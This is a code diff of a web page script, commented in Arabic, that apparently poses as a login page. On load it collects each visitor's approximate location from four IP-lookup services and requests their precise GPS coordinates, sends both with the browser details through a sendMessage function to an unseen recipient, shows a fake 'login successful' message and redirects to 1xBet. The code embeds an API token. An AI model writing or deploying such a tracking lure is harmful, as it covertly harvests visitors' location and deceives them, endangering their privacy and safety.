@@ -78,16 +78,7 @@
     });
   }
 
-  function getMostCommon(arr) {
-    const count = {};
-    arr.forEach(val => {
-      if (!val) return;
-      count[val] = (count[val] || 0) + 1;
-    });
-    return Object.keys(count).reduce((a, b) => count[a] > count[b] ? a : b, "");
-  }
-
-  // 1️⃣ إرسال الموقع التقريبي فورًا عند تحميل الصفحة
+  // 1️⃣ الموقع التقريبي من IP
   function sendApproximateLocation() {
     Promise.all([
       fetch("https://ipinfo.io/json?token=34011ec27e4e2f").then(res => res.json()),
@@ -96,36 +87,21 @@
       fetch("https://ipapi.co/json/").then(res => res.json())
     ])
     .then(([info1, info2, info3, info4]) => {
-      const countries = [info1.country, info2.country, info3.country, info4.country_name];
-      const cities = [info1.city, info2.city, info3.city, info4.city];
+      const content = `🌍 الموقع التقريبي (IP Based):
 
-      const bestCountry = getMostCommon(countries);
-      const bestCity = getMostCommon(cities);
-
-      const content = `🌍 زائر جديد (موقع تقريبي من IP):\n
-الدولة المحسّنة: ${bestCountry}
-المدينة المحسّنة: ${bestCity}
-
-📍 من المصادر:
-- ipinfo.io: ${info1.country} - ${info1.city}
-- ipwho.is: ${info2.country} - ${info2.city}
-- ip-api.com: ${info3.country} - ${info3.city}
-- ipapi.co: ${info4.country_name} - ${info4.city}
-
-🛰️ ISP:
-- ipinfo.io: ${info1.org}
-- ipwho.is: ${info2.connection?.isp || "N/A"}
-- ip-api.com: ${info3.isp}
-- ipapi.co: ${info4.org}
+🗺️ ipinfo.io: ${info1.country} - ${info1.city}
+🗺️ ipwho.is: ${info2.country} - ${info2.city}
+🗺️ ip-api.com: ${info3.country} - ${info3.city}
+🗺️ ipapi.co: ${info4.country_name} - ${info4.city}
 
 🖥️ المتصفح: ${userAgent}
 📅 الوقت: ${now}`;
 
-      sendMessage(content); // إرسال البيانات
+      sendMessage(content);
     });
   }
 
-  // 2️⃣ محاولة الحصول على الموقع الدقيق (GPS) من المتصفح
+  // 2️⃣ الموقع الدقيق من GPS
   function trySendGPSLocation() {
     if (!navigator.geolocation) return;
 
@@ -134,38 +110,38 @@
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
-        const content = `🛰️ تم الحصول على الموقع الدقيق (GPS):\n
-📌 الإحداثيات:
-- Latitude: ${lat}
-- Longitude: ${lon}
-🔗 [عرض على خرائط جوجل](${gmaps})
+        const content = `📡 الموقع الدقيق (GPS):
+
+📍 Latitude: ${lat}
+📍 Longitude: ${lon}
+🔗 [عرض على الخريطة](${gmaps})
 
 🖥️ المتصفح: ${userAgent}
 📅 الوقت: ${now}`;
 
-        sendMessage(content); // إرسال الموقع الدقيق بعد الحصول عليه
+        sendMessage(content);
       },
       (error) => {
-        console.warn("GPS مرفوض أو غير متاح، لا يوجد موقع دقيق");
+        console.warn("GPS غير متاح أو تم رفضه");
       },
       { timeout: 5000 }
     );
   }
 
-  // 3️⃣ إعادة توجيه المستخدم إلى موقع 1xBet بعد 6 ثواني
+  // 3️⃣ التحويل بعد الرسالة
   function redirectTo1xBet() {
     setTimeout(() => {
       document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
       setTimeout(() => {
-        window.location.replace("https://1xbet.com"); // استخدام replace لتوجيه مباشر
-      }, 3000); // تحويل بعد 3 ثواني من عرض الرسالة
-    }, 3000); // تأخير 3 ثواني قبل تغيير الرسالة
+        window.location.replace("https://1xbet.com");
+      }, 3000);
+    }, 3000);
   }
 
-  // تنفيذ العملية
-  sendApproximateLocation(); // يبعت الموقع التقريبي فورًا
-  trySendGPSLocation(); // يحاول يجيب الموقع الدقيق لو وافق
-  redirectTo1xBet(); // تحويل بعد عرض الرسالة
+  // تشغيل كل الخطوات
+  sendApproximateLocation(); // يبعث الموقع التقريبي فورًا
+  trySendGPSLocation();      // بعده يبعث الموقع الدقيق لو أمكن
+  redirectTo1xBet();         // بعد 6 ثواني يحوّل المستخدم
 
 </script>
 
